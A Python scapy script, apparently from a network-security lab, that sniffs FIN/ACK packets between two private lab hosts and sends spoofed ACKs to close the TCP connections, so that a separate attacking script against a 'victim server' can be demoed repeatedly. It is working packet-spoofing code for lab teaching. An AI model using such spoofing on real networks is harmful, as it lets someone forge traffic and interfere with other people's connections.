# This script allows us to close the two TCP connections; and with this, we can run the attacking script as many times as we want. Without this script, we can only demo the attacking script once and then we have to reboot the victim server before we re-try the next attack. Make sure to open two terminals. Run this one first in one terminal, and then run the attacking script in the other terminal.

from scapy.all import *

# Define the source and destination IP addresses
SOURCE_IP = "10.0.2.5"  # The IP address of the destination (where we expect the FIN/ACK packet to come from)
DESTINATION_IP = "10.0.2.4"  # The IP address of the source (where we expect the response to be sent)

def spoof_ack(fin_ack_packet):
    # Check if the packet has TCP layer and the FIN/ACK flags set
    if TCP in fin_ack_packet and fin_ack_packet[TCP].flags == "FA":
        src_ip = fin_ack_packet[IP].src
        dst_ip = fin_ack_packet[IP].dst
        src_port = fin_ack_packet[TCP].sport
        dst_port = fin_ack_packet[TCP].dport
        seq_num = fin_ack_packet[TCP].ack
        ack_num = fin_ack_packet[TCP].seq + 1  # Acknowledge the FIN flag
        
        # Only respond if the packet is from the expected source and destination IPs
        if src_ip == SOURCE_IP and dst_ip == DESTINATION_IP:
            print(f"Sniffed FIN/ACK packet from {src_ip}:{src_port} to {dst_ip}:{dst_port}")

            # Crafting the IP and TCP layers for the spoofed ACK
            ip_layer = IP(src=dst_ip, dst=src_ip)
            tcp_layer = TCP(sport=dst_port, dport=src_port, flags="A", seq=seq_num, ack=ack_num)

            # Send the spoofed ACK packet
            spoofed_ack = ip_layer / tcp_layer
            send(spoofed_ack, verbose=0)

            print(f"Sent spoofed ACK packet to {src_ip}:{src_port} acknowledging sequence number {ack_num}")

# Sniff for FIN/ACK packets on the specified IP addresses
sniff(filter=f"tcp and host {DESTINATION_IP} and host {SOURCE_IP} and (tcp[tcpflags] & tcp-fin != 0 and tcp[tcpflags] & tcp-ack != 0)", prn=spoof_ack, count=2)

